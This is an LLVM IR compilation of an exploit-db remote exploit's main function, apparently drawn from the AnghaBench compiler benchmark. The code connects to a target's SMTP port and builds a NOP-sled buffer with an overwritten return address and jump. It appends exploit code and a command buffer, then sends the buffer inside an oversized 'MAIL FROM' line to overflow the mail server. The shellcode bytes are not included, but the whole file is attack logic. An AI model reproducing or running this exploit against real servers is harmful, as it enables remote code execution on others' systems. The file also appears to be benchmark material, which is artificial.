; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19495.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19495.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8*, i8, i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"usage\0A %s HostName\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SMTP_PORT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"Can not resolve specified host.\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@exploit_code = common dso_local global i8* null, align 8
@cmdbuf = common dso_local global i8* null, align 8
@EIP = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@JMPS = common dso_local global i8 0, align 1
@JMPADR = common dso_local global i64 0, align 8
@JMPOFS = common dso_local global i8 0, align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"helo penguin\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.6 = private unnamed_addr constant [28 x i8] c"MAIL FROM: aa <%s@aa.com>\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @BUFSIZE, align 4
  %15 = add nsw i32 %14, 3000
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %8, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %9, align 8
  %19 = load i32, i32* @BUFSIZE, align 4
  %20 = zext i32 %19 to i64
  %21 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %10, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 2
  br i1 %23, label %24, label %30

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 1) #4
  unreachable

30:                                               ; preds = %2
  %31 = call i32 @bzero(%struct.sockaddr_in* %7, i32 12)
  %32 = load i32, i32* @AF_INET, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %32, i32* %33, align 4
  %34 = load i32, i32* @SMTP_PORT, align 4
  %35 = call i32 @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %35, i32* %36, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @inet_addr(i8* %39)
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %42 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %41, i32 0, i32 0
  store i32 %40, i32* %42, align 4
  %43 = icmp eq i32 %40, -1
  br i1 %43, label %44, label %68

44:                                               ; preds = %30
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call %struct.hostent* @gethostbyname(i8* %47)
  store %struct.hostent* %48, %struct.hostent** %6, align 8
  %49 = icmp eq %struct.hostent* %48, null
  br i1 %49, label %50, label %53

50:                                               ; preds = %44
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %52 = call i32 @exit(i32 1) #4
  unreachable

53:                                               ; preds = %44
  %54 = load %struct.hostent*, %struct.hostent** %6, align 8
  %55 = getelementptr inbounds %struct.hostent, %struct.hostent* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 4
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %56, i32* %57, align 4
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 0
  %60 = bitcast i32* %59 to i8*
  %61 = load %struct.hostent*, %struct.hostent** %6, align 8
  %62 = getelementptr inbounds %struct.hostent, %struct.hostent* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load %struct.hostent*, %struct.hostent** %6, align 8
  %65 = getelementptr inbounds %struct.hostent, %struct.hostent* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 8
  %67 = call i32 @memcpy(i8* %60, i8* %63, i8 signext %66)
  br label %68

68:                                               ; preds = %53, %30
  %69 = load i32, i32* @AF_INET, align 4
  %70 = load i32, i32* @SOCK_STREAM, align 4
  %71 = call i32 @socket(i32 %69, i32 %70, i32 0)
  store i32 %71, i32* %11, align 4
  %72 = icmp slt i32 %71, 0
  br i1 %72, label %73, label %76

73:                                               ; preds = %68
  %74 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %75 = call i32 @exit(i32 0) #4
  unreachable

76:                                               ; preds = %68
  %77 = load i32, i32* %11, align 4
  %78 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %79 = call i64 @connect(i32 %77, %struct.sockaddr* %78, i32 12)
  %80 = icmp slt i64 %79, 0
  br i1 %80, label %81, label %84

81:                                               ; preds = %76
  %82 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %83 = call i32 @exit(i32 0) #4
  unreachable

84:                                               ; preds = %76
  br label %85

85:                                               ; preds = %97, %84
  %86 = load i32, i32* %11, align 4
  %87 = trunc i64 %16 to i32
  %88 = call i32 @read(i32 %86, i8* %18, i32 %87)
  store i32 %88, i32* %12, align 4
  %89 = icmp sgt i32 %88, 0
  br i1 %89, label %90, label %98

90:                                               ; preds = %85
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %18, i64 %92
  store i8 0, i8* %93, align 1
  %94 = call i32* @strchr(i8* %18, i8 signext 10)
  %95 = icmp ne i32* %94, null
  br i1 %95, label %96, label %97

96:                                               ; preds = %90
  br label %98

97:                                               ; preds = %90
  br label %85

98:                                               ; preds = %96, %85
  %99 = load i8*, i8** @exploit_code, align 8
  %100 = load i8*, i8** @cmdbuf, align 8
  %101 = call i32 @strcat(i8* %99, i8* %100)
  %102 = load i8*, i8** @cmdbuf, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 23
  %104 = call signext i8 @strlen(i8* %103)
  %105 = load i8*, i8** @exploit_code, align 8
  %106 = getelementptr inbounds i8, i8* %105, i64 65
  store i8 %104, i8* %106, align 1
  %107 = load i32, i32* @BUFSIZE, align 4
  %108 = call i32 @memset(i8* %21, i32 144, i32 %107)
  %109 = load i32, i32* @EIP, align 4
  store i32 %109, i32* %13, align 4
  %110 = load i32, i32* %13, align 4
  %111 = and i32 %110, 255
  %112 = trunc i32 %111 to i8
  %113 = load i64, i64* @RETADR, align 8
  %114 = getelementptr inbounds i8, i8* %21, i64 %113
  store i8 %112, i8* %114, align 1
  %115 = load i32, i32* %13, align 4
  %116 = ashr i32 %115, 8
  %117 = and i32 %116, 255
  %118 = trunc i32 %117 to i8
  %119 = load i64, i64* @RETADR, align 8
  %120 = add i64 %119, 1
  %121 = getelementptr inbounds i8, i8* %21, i64 %120
  store i8 %118, i8* %121, align 1
  %122 = load i32, i32* %13, align 4
  %123 = ashr i32 %122, 16
  %124 = and i32 %123, 255
  %125 = trunc i32 %124 to i8
  %126 = load i64, i64* @RETADR, align 8
  %127 = add i64 %126, 2
  %128 = getelementptr inbounds i8, i8* %21, i64 %127
  store i8 %125, i8* %128, align 1
  %129 = load i32, i32* %13, align 4
  %130 = ashr i32 %129, 24
  %131 = and i32 %130, 255
  %132 = trunc i32 %131 to i8
  %133 = load i64, i64* @RETADR, align 8
  %134 = add i64 %133, 3
  %135 = getelementptr inbounds i8, i8* %21, i64 %134
  store i8 %132, i8* %135, align 1
  %136 = load i8, i8* @JMPS, align 1
  %137 = load i64, i64* @JMPADR, align 8
  %138 = getelementptr inbounds i8, i8* %21, i64 %137
  store i8 %136, i8* %138, align 1
  %139 = load i8, i8* @JMPOFS, align 1
  %140 = load i64, i64* @JMPADR, align 8
  %141 = add i64 %140, 1
  %142 = getelementptr inbounds i8, i8* %21, i64 %141
  store i8 %139, i8* %142, align 1
  %143 = load i64, i64* @RETADR, align 8
  %144 = getelementptr inbounds i8, i8* %21, i64 %143
  %145 = getelementptr inbounds i8, i8* %144, i64 4
  %146 = load i8*, i8** @exploit_code, align 8
  %147 = load i8*, i8** @exploit_code, align 8
  %148 = call signext i8 @strlen(i8* %147)
  %149 = call i32 @memcpy(i8* %145, i8* %146, i8 signext %148)
  %150 = load i32, i32* @BUFSIZE, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %21, i64 %151
  store i8 0, i8* %152, align 1
  %153 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %154 = load i32, i32* %11, align 4
  %155 = call signext i8 @strlen(i8* %18)
  %156 = call i32 @write(i32 %154, i8* %18, i8 signext %155)
  br label %157

157:                                              ; preds = %169, %98
  %158 = load i32, i32* %11, align 4
  %159 = trunc i64 %16 to i32
  %160 = call i32 @read(i32 %158, i8* %18, i32 %159)
  store i32 %160, i32* %12, align 4
  %161 = icmp sgt i32 %160, 0
  br i1 %161, label %162, label %170

162:                                              ; preds = %157
  %163 = load i32, i32* %12, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds i8, i8* %18, i64 %164
  store i8 0, i8* %165, align 1
  %166 = call i32* @strchr(i8* %18, i8 signext 10)
  %167 = icmp ne i32* %166, null
  br i1 %167, label %168, label %169

168:                                              ; preds = %162
  br label %170

169:                                              ; preds = %162
  br label %157

170:                                              ; preds = %168, %157
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %18)
  %172 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.6, i64 0, i64 0), i8* %21)
  %173 = load i32, i32* %11, align 4
  %174 = call signext i8 @strlen(i8* %18)
  %175 = call i32 @write(i32 %173, i8* %18, i8 signext %174)
  %176 = call i32 @sleep(i32 100)
  %177 = load i32, i32* %11, align 4
  %178 = call i32 @close(i32 %177)
  %179 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %179)
  %180 = load i32, i32* %3, align 4
  ret i32 %180
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i8 signext) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32* @strchr(i8*, i8 signext) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local signext i8 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @write(i32, i8*, i8 signext) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
